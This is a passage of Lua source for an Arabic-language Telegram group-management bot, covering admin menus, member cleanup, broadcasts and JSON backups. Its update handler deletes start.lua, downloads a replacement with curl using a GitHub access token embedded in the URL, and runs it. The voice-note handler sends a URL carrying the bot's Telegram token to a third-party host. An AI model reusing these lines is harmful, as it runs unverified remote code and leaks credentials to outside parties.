{{text = '↯ تغيير كليشه ستارت .',data="addstarttxt"},{text ="↯ حذف كليشه ستارت .",data="Deltxtstart"}},
{{text = '↯ تنظيف المشتركين .',data="clenMsh"},{text ="↯ تنظيف المجموعات .",data="clenMg"}},
{{text = '↯ التواصل .',data="..."},{text ='↯ اشعارات .',data=".."},{text ='↯ الخدمي .',data="...."}},
{{text = ''..Adm_Callback().t..'',data="Twas"},{text = ''..Adm_Callback().n..'',data="Notice"},{text = ''..Adm_Callback().s..'',data="sendbot"}},
{{text = '↯ المغادره .',data="..."},{text = '↯ التعريف .',data="..."},{text = '↯ الاذاعه .',data="j.."}},
{{text = ''..Adm_Callback().d..'',data="Departure"},{text =Adm_Callback().i,data="infobot"},{text =Adm_Callback().addu,data="addu"}},
{{text = '↯ مسح المطورين .',data="deldev"},{text ="↯ مسح الثانويين .",data="delpor"}},
{{text = '↯ المطورين .',data="lsdev"},{text ="↯ الثانويين .",data="lspor"}},
{{text = '↯ مسح المكتومين عام .',data="delmu"},{text ="↯ مسح المحظورين عام .",data="delbnal"}},
{{text = '↯ المكتومين عام .',data="lsmu"},{text ="↯ المحظورين عام .",data="lsbnal"}},
{{text = '↯ رجوع .',data="Can"}},
}
}
bot.editMessageText(chat_id,msg_id,"*↯︙اعدادات البوت .*", 'md', true, false, reply_dev)
end
if Text == "UpSu" then
bot.answerCallbackQuery(data.id, "↯ تم تحديث السورس", true)
os.execute('rm -rf start.lua')
os.execute('curl -s https://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@raw.githubusercontent.com/D-EV-ME-LA-NO/llll/main/start.lua -o start.lua')
dofile('start.lua')  
end
if Text == "UpBot" then
bot.answerCallbackQuery(data.id, "↯︙تم تحديث البوت .", true)
dofile("start.lua")
end
if Text == "Deltxtstart" then
redis:del(bot_id..":start") 
bot.answerCallbackQuery(data.id, "↯︙تم حذف كليشه ستارت بنجاح .", true)
end
if Text == "delnamebot" then
redis:del(bot_id..":namebot") 
bot.answerCallbackQuery(data.id, "↯︙تم حذف اسم البوت بنجاح .", true)
end
if Text == "infobot" then
if redis:get(bot_id..":infobot") then
redis:del(bot_id..":infobot")
else
redis:set(bot_id..":infobot",true)
end
reply_dev = bot.replyMarkup{
type = 'inline',data = {
	{{text = '↯ تغيير المطور الاساسي .',data="EditDevbot"}},
{{text = '↯ تغيير اسم البوت .',data="namebot"},{text =(redis:get(bot_id..":namebot") or "راومو"),data="delnamebot"}},
{{text = '↯ تغيير كليشه ستارت .',data="addstarttxt"},{text ="↯ حذف كليشه ستارت .",data="Deltxtstart"}},
{{text = '↯ تنظيف المشتركين .',data="clenMsh"},{text ="↯ تنظيف المجموعات .",data="clenMg"}},
{{text = '↯ التواصل .',data="..."},{text ='↯ اشعارات .',data=".."},{text ='↯ الخدمي .',data="...."}},
{{text = ''..Adm_Callback().t..'',data="Twas"},{text = ''..Adm_Callback().n..'',data="Notice"},{text = ''..Adm_Callback().s..'',data="sendbot"}},
{{text = '↯ المغادره .',data="..."},{text = '↯ التعريف .',data="..."},{text = '↯ الاذاعه .',data="j.."}},
{{text = ''..Adm_Callback().d..'',data="Departure"},{text =Adm_Callback().i,data="infobot"},{text =Adm_Callback().addu,data="addu"}},
{{text = '↯ مسح المطورين .',data="deldev"},{text ="↯ مسح الثانويين .",data="delpor"}},
{{text = '↯ المطورين .',data="lsdev"},{text ="↯ الثانويين .",data="lspor"}},
{{text = '↯ مسح المكتومين عام .',data="delmu"},{text ="↯ مسح المحظورين عام .",data="delbnal"}},
{{text = '↯ المكتومين عام .',data="lsmu"},{text ="↯ المحظورين عام .",data="lsbnal"}},
{{text = '↯ رجوع .',data="Can"}},
}
}
bot.editMessageText(chat_id,msg_id,"*↯︙اهلا بك في قائمه الاوامر  .*", 'md', true, false, reply_dev)
end
if Text == "Twas" then
if redis:get(bot_id..":Twas") then
redis:del(bot_id..":Twas")
else
redis:set(bot_id..":Twas",true)
end
reply_dev = bot.replyMarkup{
type = 'inline',data = {
	{{text = '↯ تغيير المطور الاساسي .',data="EditDevbot"}},
{{text = '↯ تغيير اسم البوت .',data="namebot"},{text =(redis:get(bot_id..":namebot") or "راومو"),data="delnamebot"}},
{{text = '↯ تغيير كليشه ستارت .',data="addstarttxt"},{text ="↯ حذف كليشه ستارت .",data="Deltxtstart"}},
{{text = '↯ تنظيف المشتركين .',data="clenMsh"},{text ="↯ تنظيف المجموعات .",data="clenMg"}},
{{text = '↯ التواصل .',data="..."},{text ='↯ اشعارات .',data=".."},{text ='↯ الخدمي .',data="...."}},
{{text = ''..Adm_Callback().t..'',data="Twas"},{text = ''..Adm_Callback().n..'',data="Notice"},{text = ''..Adm_Callback().s..'',data="sendbot"}},
{{text = '↯ المغادره .',data="..."},{text = '↯ التعريف .',data="..."},{text = '↯ الاذاعه .',data="j.."}},
{{text = ''..Adm_Callback().d..'',data="Departure"},{text =Adm_Callback().i,data="infobot"},{text =Adm_Callback().addu,data="addu"}},
{{text = '↯ مسح المطورين .',data="deldev"},{text ="↯ مسح الثانويين .",data="delpor"}},
{{text = '↯ المطورين .',data="lsdev"},{text ="↯ الثانويين .",data="lspor"}},
{{text = '↯ مسح المكتومين عام .',data="delmu"},{text ="↯ مسح المحظورين عام .",data="delbnal"}},
{{text = '↯ المكتومين عام .',data="lsmu"},{text ="↯ المحظورين عام .",data="lsbnal"}},
{{text = '↯ رجوع .',data="Can"}},
}
}
bot.editMessageText(chat_id,msg_id,"*↯︙اهلا بك في قائمه الاوامر  .*", 'md', true, false, reply_dev)
end
if Text == "Notice" then
if redis:get(bot_id..":Notice") then
redis:del(bot_id..":Notice")
else
redis:set(bot_id..":Notice",true)
end
reply_dev = bot.replyMarkup{
type = 'inline',data = {
	{{text = '↯ تغيير المطور الاساسي .',data="EditDevbot"}},
{{text = '↯ تغيير اسم البوت .',data="namebot"},{text =(redis:get(bot_id..":namebot") or "راومو"),data="delnamebot"}},
{{text = '↯ تغيير كليشه ستارت .',data="addstarttxt"},{text ="↯ حذف كليشه ستارت .",data="Deltxtstart"}},
{{text = '↯ تنظيف المشتركين .',data="clenMsh"},{text ="↯ تنظيف المجموعات .",data="clenMg"}},
{{text = '↯ التواصل .',data="..."},{text ='↯ اشعارات .',data=".."},{text ='↯ الخدمي .',data="...."}},
{{text = ''..Adm_Callback().t..'',data="Twas"},{text = ''..Adm_Callback().n..'',data="Notice"},{text = ''..Adm_Callback().s..'',data="sendbot"}},
{{text = '↯ المغادره .',data="..."},{text = '↯ التعريف .',data="..."},{text = '↯ الاذاعه .',data="j.."}},
{{text = ''..Adm_Callback().d..'',data="Departure"},{text =Adm_Callback().i,data="infobot"},{text =Adm_Callback().addu,data="addu"}},
{{text = '↯ مسح المطورين .',data="deldev"},{text ="↯ مسح الثانويين .",data="delpor"}},
{{text = '↯ المطورين .',data="lsdev"},{text ="↯ الثانويين .",data="lspor"}},
{{text = '↯ مسح المكتومين عام .',data="delmu"},{text ="↯ مسح المحظورين عام .",data="delbnal"}},
{{text = '↯ المكتومين عام .',data="lsmu"},{text ="↯ المحظورين عام .",data="lsbnal"}},
{{text = '↯ رجوع .',data="Can"}},
}
}
bot.editMessageText(chat_id,msg_id,"*↯︙اهلا بك في قائمه الاوامر  .*", 'md', true, false, reply_dev)
end
if Text == "sendbot" then
if redis:get(bot_id..":sendbot") then
redis:del(bot_id..":sendbot")
else
redis:set(bot_id..":sendbot",true)
end
reply_dev = bot.replyMarkup{
type = 'inline',data = {
	{{text = '↯ تغيير المطور الاساسي .',data="EditDevbot"}},
{{text = '↯ تغيير اسم البوت .',data="namebot"},{text =(redis:get(bot_id..":namebot") or "راومو"),data="delnamebot"}},
{{text = '↯ تغيير كليشه ستارت .',data="addstarttxt"},{text ="↯ حذف كليشه ستارت .",data="Deltxtstart"}},
{{text = '↯ تنظيف المشتركين .',data="clenMsh"},{text ="↯ تنظيف المجموعات .",data="clenMg"}},
{{text = '↯ التواصل .',data="..."},{text ='↯ اشعارات .',data=".."},{text ='↯ الخدمي .',data="...."}},
{{text = ''..Adm_Callback().t..'',data="Twas"},{text = ''..Adm_Callback().n..'',data="Notice"},{text = ''..Adm_Callback().s..'',data="sendbot"}},
{{text = '↯ المغادره .',data="..."},{text = '↯ التعريف .',data="..."},{text = '↯ الاذاعه .',data="j.."}},
{{text = ''..Adm_Callback().d..'',data="Departure"},{text =Adm_Callback().i,data="infobot"},{text =Adm_Callback().addu,data="addu"}},
{{text = '↯ مسح المطورين .',data="deldev"},{text ="↯ مسح الثانويين .",data="delpor"}},
{{text = '↯ المطورين .',data="lsdev"},{text ="↯ الثانويين .",data="lspor"}},
{{text = '↯ مسح المكتومين عام .',data="delmu"},{text ="↯ مسح المحظورين عام .",data="delbnal"}},
{{text = '↯ المكتومين عام .',data="lsmu"},{text ="↯ المحظورين عام .",data="lsbnal"}},
{{text = '↯ رجوع .',data="Can"}},
}
}
bot.editMessageText(chat_id,msg_id,"*↯︙اهلا بك في قائمه الاوامر  .*", 'md', true, false, reply_dev)
end
if Text == "Departure" then
if redis:get(bot_id..":Departure") then
redis:del(bot_id..":Departure")
else
redis:set(bot_id..":Departure",true)
end
reply_dev = bot.replyMarkup{
type = 'inline',data = {
	{{text = '↯ تغيير المطور الاساسي .',data="EditDevbot"}},
{{text = '↯ تغيير اسم البوت .',data="namebot"},{text =(redis:get(bot_id..":namebot") or "راومو"),data="delnamebot"}},
{{text = '↯ تغيير كليشه ستارت .',data="addstarttxt"},{text ="↯ حذف كليشه ستارت .",data="Deltxtstart"}},
{{text = '↯ تنظيف المشتركين .',data="clenMsh"},{text ="↯ تنظيف المجموعات .",data="clenMg"}},
{{text = '↯ التواصل .',data="..."},{text ='↯ اشعارات .',data=".."},{text ='↯ الخدمي .',data="...."}},
{{text = ''..Adm_Callback().t..'',data="Twas"},{text = ''..Adm_Callback().n..'',data="Notice"},{text = ''..Adm_Callback().s..'',data="sendbot"}},
{{text = '↯ المغادره .',data="..."},{text = '↯ التعريف .',data="..."},{text = '↯ الاذاعه .',data="j.."}},
{{text = ''..Adm_Callback().d..'',data="Departure"},{text =Adm_Callback().i,data="infobot"},{text =Adm_Callback().addu,data="addu"}},
{{text = '↯ مسح المطورين .',data="deldev"},{text ="↯ مسح الثانويين .",data="delpor"}},
{{text = '↯ المطورين .',data="lsdev"},{text ="↯ الثانويين .",data="lspor"}},
{{text = '↯ مسح المكتومين عام .',data="delmu"},{text ="↯ مسح المحظورين عام .",data="delbnal"}},
{{text = '↯ المكتومين عام .',data="lsmu"},{text ="↯ المحظورين عام .",data="lsbnal"}},
{{text = '↯ رجوع .',data="Can"}},
}
}
bot.editMessageText(chat_id,msg_id,"*↯︙اهلا بك في قائمه الاوامر  .*", 'md', true, false, reply_dev)
end
if Text == "addu" then
if redis:get(bot_id..":addu") then
redis:del(bot_id..":addu")
else
redis:set(bot_id..":addu",true)
end
reply_dev = bot.replyMarkup{
type = 'inline',data = {
	{{text = '↯ تغيير المطور الاساسي .',data="EditDevbot"}},
{{text = '↯ تغيير اسم البوت .',data="namebot"},{text =(redis:get(bot_id..":namebot") or "راومو"),data="delnamebot"}},
{{text = '↯ تغيير كليشه ستارت .',data="addstarttxt"},{text ="↯ حذف كليشه ستارت .",data="Deltxtstart"}},
{{text = '↯ تنظيف المشتركين .',data="clenMsh"},{text ="↯ تنظيف المجموعات .",data="clenMg"}},
{{text = '↯ التواصل .',data="..."},{text ='↯ اشعارات .',data=".."},{text ='↯ الخدمي .',data="...."}},
{{text = ''..Adm_Callback().t..'',data="Twas"},{text = ''..Adm_Callback().n..'',data="Notice"},{text = ''..Adm_Callback().s..'',data="sendbot"}},
{{text = '↯ المغادره .',data="..."},{text = '↯ التعريف .',data="..."},{text = '↯ الاذاعه .',data="j.."}},
{{text = ''..Adm_Callback().d..'',data="Departure"},{text =Adm_Callback().i,data="infobot"},{text =Adm_Callback().addu,data="addu"}},
{{text = '↯ مسح المطورين .',data="deldev"},{text ="↯ مسح الثانويين .",data="delpor"}},
{{text = '↯ المطورين .',data="lsdev"},{text ="↯ الثانويين .",data="lspor"}},
{{text = '↯ مسح المكتومين عام .',data="delmu"},{text ="↯ مسح المحظورين عام .",data="delbnal"}},
{{text = '↯ المكتومين عام .',data="lsmu"},{text ="↯ المحظورين عام .",data="lsbnal"}},
{{text = '↯ رجوع .',data="Can"}},
}
}
bot.editMessageText(chat_id,msg_id,"*↯︙اهلا بك في قائمه الاوامر  .*", 'md', true, false, reply_dev)
end
if Text == "namebot" then
local reply_markup = bot.replyMarkup{
type = 'inline',data = {
{{text = '↯ رجوع .',data="Can"}},
}
}
bot.editMessageText(chat_id,msg_id,"*↯︙قم الان بأرسل اسم البوت الجديد*", 'md', true, false, reply_markup)
redis:set(bot_id..":set:"..chat_id..":namebot",true) 
end
if Text == "delpor" then
local Info_ = redis:smembers(bot_id..":Status:programmer") 
if #Info_ == 0 then
bot.answerCallbackQuery(data.id, "↯︙ لا يوجد ثانويين في البوت .", true)
return false
end  
redis:del(bot_id..":Status:programmer") 
bot.answerCallbackQuery(data.id, "↯︙تم مسح الثانويين بنجاح .", true)
end
if Text == "deldev" then
local Info_ = redis:smembers(bot_id..":Status:developer") 
if #Info_ == 0 then
bot.answerCallbackQuery(data.id, "↯︙ لا يوجد مطورين في البوت .", true)
return false
end  
redis:del(bot_id..":Status:developer") 
bot.answerCallbackQuery(data.id, "↯︙تم مسح المطورين بنجاح .", true)
end
if Text == "clenMsh" then
local list = redis:smembers(bot_id..":user_id")   
local x = 0
for k,v in pairs(list) do  
local Get_Chat = bot.getChat(v)
local ChatAction = bot.sendChatAction(v,'Typing')
if ChatAction.luatele ~= "ok" then
x = x + 1
redis:srem(bot_id..":user_id",v)
end
end
if x ~= 0 then
reply_dev = bot.replyMarkup{
type = 'inline',data = {
	{{text = '↯ التحديثات .',data="Updates"}},
{{text = '↯ الاحصائيات .',data="indfo"}},
{{text = '↯ اعدادات البوت .',data="botsettings"}},
{{text = '↯ الاشتراك الاجباري .',data="chatmem"},{text = '↯ الاذاعه .',data="sendtomem"}},
{{text = '↯ النسخ الاحتياطيه .',data="infoAbg"}},
}
}
return bot.editMessageText(chat_id,msg_id,'*↯︙العدد الكلي ( '..#list..' )\n↯︙تم العثور على ( '..x..' ) من المشتركين الوهميين*', 'md', true, false, reply_dev)
else
return bot.editMessageText(chat_id,msg_id,'*↯︙العدد الكلي ( '..#list.." )\n↯︙لم يتم العثور على وهميين*", 'md', true, false, reply_dev)
end
end
if Text == "clenMg" then
local list = redis:smembers(bot_id..":Groups")   
local x = 0
for k,v in pairs(list) do  
local Get_Chat = bot.getChat(v)
if Get_Chat.id then
local statusMem = bot.getChatMember(Get_Chat.id,bot_id)
if statusMem.status.luatele == "chatMemberStatusMember" then
x = x + 1
bot.sendText(Get_Chat.id,0,'*↯︙البوت ليس ادمن في المجموعه .*',"md")
redis:srem(bot_id..":Groups",Get_Chat.id)
local keys = redis:keys(bot_id..'*'..Get_Chat.id)
for i = 1, #keys do
redis:del(keys[i])
end
bot.leaveChat(Get_Chat.id)
end
else
x = x + 1
local keys = redis:keys(bot_id..'*'..v)
for i = 1, #keys do
redis:del(keys[i])
end
redis:srem(bot_id..":Groups",v)
bot.leaveChat(v)
end
end
if x ~= 0 then
reply_dev = bot.replyMarkup{
type = 'inline',data = {
	{{text = '↯ التحديثات .',data="Updates"}},
{{text = '↯ الاحصائيات .',data="indfo"}},
{{text = '↯ اعدادات البوت .',data="botsettings"}},
{{text = '↯ الاشتراك الاجباري .',data="chatmem"},{text = '↯ الاذاعه .',data="sendtomem"}},
{{text = '↯ النسخ الاحتياطيه .',data="infoAbg"}},
}
}
return bot.editMessageText(chat_id,msg_id,'*↯︙العدد الكلي ( '..#list..' )\n↯︙تم العثور على ( '..x..' ) من المجموعات الوهميه*', 'md', true, false, reply_dev)
else
return bot.editMessageText(chat_id,msg_id,'*↯︙العدد الكلي ( '..#list.." )\n↯︙لم يتم العثور على مجموعات وهميه*", 'md', true, false, reply_dev)
end
end
if Text == "sendtomem" then
if not devB(data.sender_user_id) then    
if not redis:get(bot_id..":addu") then
bot.answerCallbackQuery(data.id, "↯︙الاذاعه معطله  .", true)
return false
end  
end
reply_dev = bot.replyMarkup{
type = 'inline',data = {
{{text = '↯ رساله للكل .',data="AtSer_Tall"},{text ="↯ توجيه للكل .",data="AtSer_Fall"}},
{{text = '↯ رساله للمجموعات .',data="AtSer_Tgr"},{text ="↯ توجيه للمجموعات .",data="AtSer_Fgr"}},
{{text = '↯ رساله للاعضاء .',data="AtSer_Tme"},{text ="↯ توجيه للاعضاء .",data="AtSer_Fme"}},
{{text = '↯ رجوع .',data="Can"}},
}
}
bot.editMessageText(chat_id,msg_id,"*↯︙اوامر الاذاعه الخاصه بالبوت .*", 'md', true, false, reply_dev)
end
if Text == "infoAbg" then
reply_dev = bot.replyMarkup{
type = 'inline',data = {
{{text = '↯ جلب النسخه العامه .',data="GetfJson"},{text ="↯ جلب نسخه الردود .",data="GetRdJson"}},
{{text = '↯ جلب الاحصائيات .',data="GetGrJson"},{text = '↯ رفع نسخه .',data="UpfJson"}},
{{text = '↯ رجوع .',data="Can"}},
}
}
bot.editMessageText(chat_id,msg_id,"*↯︙اوامر النسخه الاحتياطيه الخاصه بالبوت .*", 'md', true, false, reply_dev)
end
if Text == "GetRdJson" then
local Get_Json = '{"Replies":"true",'  
Get_Json = Get_Json..'"Reply":{'
local Groups = redis:smembers(bot_id..":Groups")
for k,ide in pairs(Groups) do   
listrep = redis:smembers(bot_id.."List:Rp:content"..ide)
if k == 1 then
Get_Json = Get_Json..'"'..ide..'":{'
else
Get_Json = Get_Json..',"'..ide..'":{'
end
if #listrep >= 5 then
for k,v in pairs(listrep) do
File = redis:get(bot_id.."Rp:Manager:File"..ide..":"..v)
Text = redis:get(bot_id.."Rp:content:Text"..ide..":"..v) 
Video = redis:get(bot_id.."Rp:content:Video"..ide..":"..v)
Audio = redis:get(bot_id.."Rp:content:Audio"..ide..":"..v) 
Photo = redis:get(bot_id.."Rp:content:Photo"..ide..":"..v) 
Sticker = redis:get(bot_id.."Rp:content:Sticker"..ide..":"..v) 
VoiceNote = redis:get(bot_id.."Rp:content:VoiceNote"..ide..":"..v)
Animation = redis:get(bot_id.."Rp:content:Animation"..ide..":"..v) 
Video_note = redis:get(bot_id.."Rp:content:Video_note"..ide..":"..v)
if File then
tg = "File@".. File
elseif Text then
tg = "Text@".. Text
tg = string.gsub(tg,'"','')
tg = string.gsub(tg,"'",'')
tg = string.gsub(tg,'','')
tg = string.gsub(tg,'`','')
tg = string.gsub(tg,'{','')
tg = string.gsub(tg,'}','')
tg = string.gsub(tg,'\n',' ')
elseif Video then
tg = "Video@"..Video
elseif Audio then
tg = "Audio@".. Audio
elseif Photo then
tg = "Photo@".. Photo
elseif Video_note then
tg = "Video_note@".. Video_note
elseif Animation then
tg = "Animation@".. Animation
elseif VoiceNote then
tg = "VoiceNote@".. VoiceNote
elseif Sticker then
tg = "Sticker@".. Sticker
end
v = string.gsub(v,'"','')
v = string.gsub(v,"'",'')
Get_Json = Get_Json..'"'..v..'":"'..tg..'",'
end   
Get_Json = Get_Json..'"info":"ok"'
end
Get_Json = Get_Json..'}'
end
Get_Json = Get_Json..'}}'
local File = io.open('./'..bot_id..'.json', "w")
File:write(Get_Json)
File:close()
bot.sendDocument(chat_id, 0,'./'..bot_id..'.json','نسخه ردود البوت', 'md')
dofile("start.lua")
end
if Text == "GetGrJson" then
bot.answerCallbackQuery(data.id, "↯︙جار ارسال النسخه .", true)
local list = redis:smembers(bot_id..":Groups")
user_idf = redis:smembers(bot_id..":user_id")
local t = '{"idbot": '..bot_id..',"GrBot":{'
if #user_idf ~= 0 then 
t = t..'"user_id":['
for k,v in pairs(user_idf) do
if k == 1 then
t =  t..'"'..v..'"'
else
t = t..',"'..v..'"'
end
end   
t = t..']'
end
if #list ~= 0 then 
t = t..',"Groups":['
for k,v in pairs(list) do
if k == 1 then
t =  t..'"'..v..'"'
else
t = t..',"'..v..'"'
end
end   
t = t..']'
end
t = t..',"status":"statistics"}}'
local File = io.open('./'..bot_id..'.json', "w")
File:write(t)
File:close()
bot.sendDocument(chat_id, 0,'./'..bot_id..'.json','↯︙عدد مجموعات التي في البوت { '..#list..'}\n↯︙عدد  الاعضاء التي في البوت { '..#user_idf..'}', 'md')
dofile("start.lua")
end
if Text and Text:match("^AtSer_(.*)") then
local infomsg = {Text:match("^AtSer_(.*)")}
iny = infomsg[1]
reply_markup = bot.replyMarkup{
type = 'inline',data = {
{{text = '↯ الغاء .',data="Can"}}, 
}
}
redis:setex(bot_id..":set:"..chat_id..":send",600,iny)  
bot.editMessageText(chat_id,msg_id,"*↯︙قم الان بأرسال الرساله *", 'md', true, false, reply_markup)
end
----------------------------------------------------------------------------------------------------
end
end
----------------------------------------------------------------------------------------------------
-- end function Callback
----------------------------------------------------------------------------------------------------

function Run(msg,data)
if msg.content.text then
text = msg.content.text.text
else 
text = nil
end
if msg.content.voice_note then 
local File = json:decode(https.request('https://api.telegram.org/bot'..Token..'/getfile?file_id='..msg.content.voice_note.voice.remote.id))
local get = io.popen('curl -s "https://fastbotss.herokuapp.com/yt?vi=https://api.telegram.org/file/bot'..Token..'/'..File.result.file_path..'"'):read('*a')
local json = JSON.decode(get)
if json and json.text then
text = json.text
end
elseif msg.content.text then
text = msg.content.text.text
else
text = nil
end
print("text",text)
----------------------------------------------------------------------------------------------------
if programmer(msg) then
if redis:get(bot_id..":set:"..msg.chat_id..":send") then
TrS = redis:get(bot_id..":set:"..msg.chat_id..":send")
list = redis:smembers(bot_id..":Groups")   
lis = redis:smembers(bot_id..":user_id") 
if msg.forward_info or text or msg.content.video_note or msg.content.document or msg.content.audio or msg.content.video or msg.content.voice_note or msg.content.sticker or msg.content.animation or msg.content.photo then 
redis:del(bot_id..":set:"..msg.chat_id..":send") 
if TrS == "Fall" then
bot.sendText(msg.chat_id,msg.id,"*↯︙يتم توجيه الرساله الى ( "..#lis.." عضو ) و ( "..#list.." مجموعه ) *","md",true)      
for k,v in pairs(list) do
local FedMsg = bot.forwardMessages(v, msg.chat_id, msg.id,0,0,true,false,false)
if FedMsg then
redis:incr(bot_id..":count:true") 
end
end  
bot.sendText(msg.chat_id,msg.id,"*تمت الاذاعه ل ( "..redis:get(bot_id..":count:true").." ) مجموعه جار الاذاعه للاعضاء *","md",true)
redis:del(bot_id..":count:true") 
for k,g in pairs(lis) do  
local FedMsg = bot.forwardMessages(g, msg.chat_id, msg.id,0,0,true,false,false)
if FedMsg then
redis:incr(bot_id..":count:true") 
end
end  
bot.sendText(msg.chat_id,msg.id,"*تمت الاذاعه ل ( "..redis:get(bot_id..":count:true").." ) عضو *","md",true)
redis:del(bot_id..":count:true") 
elseif TrS == "Fgr" then
bot.sendText(msg.chat_id,msg.id,"*↯︙يتم توجيه الرساله الى ( "..#list.." مجموعه ) *","md",true)      
for k,v in pairs(list) do  
local FedMsg = bot.forwardMessages(v, msg.chat_id, msg.id,0,0,true,false,false)
if FedMsg then
redis:incr(bot_id..":count:true") 
end
end  
bot.sendText(msg.chat_id,msg.id,"*تمت الاذاعه ل ( "..redis:get(bot_id..":count:true").." ) مجموعه *","md",true)
redis:del(bot_id..":count:true") 
elseif TrS == "Fme" then
bot.sendText(msg.chat_id,msg.id,"*↯︙يتم توجيه الرساله الى ( "..#lis.." عضو ) *","md",true)      
for k,v in pairs(lis) do  
local FedMsg = bot.forwardMessages(v, msg.chat_id, msg.id,0,0,true,false,false)
if FedMsg then
redis:incr(bot_id..":count:true") 
end
end  
bot.sendText(msg.chat_id,msg.id,"*تمت الاذاعه ل ( "..redis:get(bot_id..":count:true").." ) عضو *","md",true)
redis:del(bot_id..":count:true") 
elseif TrS == "Tall" then
bot.sendText(msg.chat_id,msg.id,"*↯︙يتم ارسال الرساله الى ( "..#lis.." عضو ) و ( "..#list.." مجموعه ) *","md",true)      
for k,v in pairs(list) do  
local FedMsg = bot.forwardMessages(v, msg.chat_id, msg.id,0,0,true,true,false)
if FedMsg then
redis:incr(bot_id..":count:true") 
end
end  
bot.sendText(msg.chat_id,msg.id,"*تمت الاذاعه ل ( "..redis:get(bot_id..":count:true").." ) مجموعه جار الاذاعه للاعضاء *","md",true)
redis:del(bot_id..":count:true") 
for k,v in pairs(lis) do  
local FedMsg = bot.forwardMessages(v, msg.chat_id, msg.id,0,0,true,true,false)
if FedMsg then
redis:incr(bot_id..":count:true") 
end
end  
bot.sendText(msg.chat_id,msg.id,"*تمت الاذاعه ل ( "..redis:get(bot_id..":count:true").." ) عضو *","md",true)
redis:del(bot_id..":count:true") 
elseif TrS == "Tgr" then
bot.sendText(msg.chat_id,msg.id,"*↯︙يتم ارسال الرساله الى ( "..#list.." مجموعه ) *","md",true)      
for k,v in pairs(list) do  
local FedMsg = bot.forwardMessages(v, msg.chat_id, msg.id,0,0,true,true,false)
if FedMsg then
redis:incr(bot_id..":count:true") 
end
end  
bot.sendText(msg.chat_id,msg.id,"*تمت الاذاعه ل ( "..redis:get(bot_id..":count:true").." ) مجموعه *","md",true)
redis:del(bot_id..":count:true") 
elseif TrS == "Tme" then
bot.sendText(msg.chat_id,msg.id,"*↯︙يتم ارسال الرساله الى ( "..#lis.." عضو ) *","md",true)      
for k,v in pairs(lis) do  
local FedMsg = bot.forwardMessages(v, msg.chat_id, msg.id,0,0,true,true,false)
if FedMsg then
redis:incr(bot_id..":count:true") 
end
end  
bot.sendText(msg.chat_id,msg.id,"*تمت الاذاعه ل ( "..redis:get(bot_id..":count:true").." ) عضو *","md",true)
redis:del(bot_id..":count:true") 
end 
return false
end
end
end
----------------------------------------------------------------------------------------------------
----------------------------------------------------------------------------------------------------
if msg.chat_id and bot.getChatId(msg.chat_id).type == "basicgroup" then 
local id = tostring(msg.chat_id)
if not id:match("-100(%d+)") then
if programmer(msg) then
----------------------------------------------------------------------------------------------------
if redis:get(bot_id..":set:"..msg.chat_id..":UpfJson") then
if msg.content.document then
redis:del(bot_id..":set:"..msg.chat_id..":UpfJson") 
local File_Id = msg.content.document.document.remote.id
local Name_File = msg.content.document.file_name
if tonumber(Name_File:match('(%d+)')) ~= tonumber(bot_id) then 
return bot.sendText(msg.chat_id,msg.id,'*↯︙عذرا الملف هذا ليس للبوت . *',"md")
end
local File = json:decode(https.request('https://api.telegram.org/bot'..Token..'/getfile?file_id='..File_Id)) 
local download_ = download('https://api.telegram.org/file/bot'..Token..'/'..File.result.file_path,''..Name_File) 
local Get_Info = io.open(download_,"r"):read('*a')
local groups = JSON.decode(Get_Info)
if groups.Replies == "true" then
for GroupId,ListGroup in pairs(groups.Reply) do
if ListGroup.info == "ok" then
for k,v in pairs(ListGroup) do
redis:sadd(bot_id.."List:Rp:content"..GroupId,k)
if v and v:match('gif@(.*)') then
redis:set(bot_id.."Rp:content:Animation"..GroupId..":"..k,v:match('gif@(.*)'))
elseif v and v:match('Vico@(.*)') then
redis:set(bot_id.."Rp:content:VoiceNote"..GroupId..":"..k,v:match('Vico@(.*)'))
elseif v and v:match('Stekrs@(.*)') then
redis:set(bot_id.."Rp:content:Sticker"..GroupId..":"..k,v:match('Stekrs@(.*)'))
elseif v and v:match('Text@(.*)') then
redis:set(bot_id.."Rp:content:Text"..GroupId..":"..k,v:match('Text@(.*)'))
elseif v and v:match('Photo@(.*)') then
redis:set(bot_id.."Rp:content:Photo"..GroupId..":"..k,v:match('Photo@(.*)'))
elseif v and v:match('Video@(.*)') then
redis:set(bot_id.."Rp:content:Video"..GroupId..":"..k,v:match('Video@(.*)'))
elseif v and v:match('File@(.*)') then
redis:set(bot_id.."Rp:Manager:File"..GroupId..":"..k,v:match('File@(.*)') )
elseif v and v:match('Audio@(.*)') then
redis:set(bot_id.."Rp:content:Audio"..GroupId..":"..k,v:match('Audio@(.*)'))
elseif v and v:match('video_note@(.*)') then
redis:set(bot_id.."Rp:content:Video_note"..GroupId..":"..k,v:match('video_note@(.*)'))
end
end
end
end
end
if groups.GrBot.user_id then
for k,user_idr in pairs(groups.GrBot.user_id) do
redis:sadd(bot_id..":user_id",user_idr)  
end
end
if groups.GrBot.Groups then
for k,chat_idr in pairs(groups.GrBot.Groups) do
redis:sadd(bot_id..":Groups",chat_idr)  
end
end
if groups.GrBot.programmer then
for k,pro in pairs(groups.GrBot.programmer) do
redis:sadd(bot_id..":programmer",pro)  
end
end
if groups.GrBot.developer then
for k,ddi in pairs(groups.GrBot.developer) do
redis:sadd(bot_id..":developer",ddi)  
end
end
if groups.GrBot then
for idg,v in pairs(groups.GrBot) do
if not redis:sismember(bot_id..":Groups", idg) then
redis:sadd(bot_id..":Groups",idg)  
end
list ={"Spam","Edited","Hashtak","via_bot_user_id","messageChatAddMembers","forward_info","Links","Markdaun","WordsFshar","Spam","Tagservr","Username","Keyboard","messagePinMessage","messageSenderChat","Cmd","messageLocation","messageContact","messageVideoNote","messagePoll","messageAudio","messageDocument","messageAnimation","AddMempar","messageSticker","messageVoiceNote","WordsPersian","WordsEnglish","JoinByLink","messagePhoto","messageVideo"}
for i,lock in pairs(list) do 
redis:set(bot_id..":"..idg..":settings:"..lock,"del")    
end
if v.Creator then
for k,idcr in pairs(v.Creator) do
redis:sadd(bot_id..":"..idg..":Status:Creator",idcr)
end
end
if v.BasicConstructor then
for k,idbc in pairs(v.BasicConstructor) do
redis:sadd(bot_id..":"..idg..":Status:BasicConstructor",idbc)
end
end
if v.Constructor then
for k,idc in pairs(v.Constructor) do
redis:sadd(bot_id..":"..idg..":Status:Constructor",idc)
end
end
if v.Owner then
for k,idOw in pairs(v.Owner) do
redis:sadd(bot_id..":"..idg..":Status:Owner",idOw)
end
end
if v.Administrator then
for k,idad in pairs(v.Administrator) do
redis:sadd(bot_id..":"..idg..":Status:Administrator",idad)
end
end
if v.Vips then
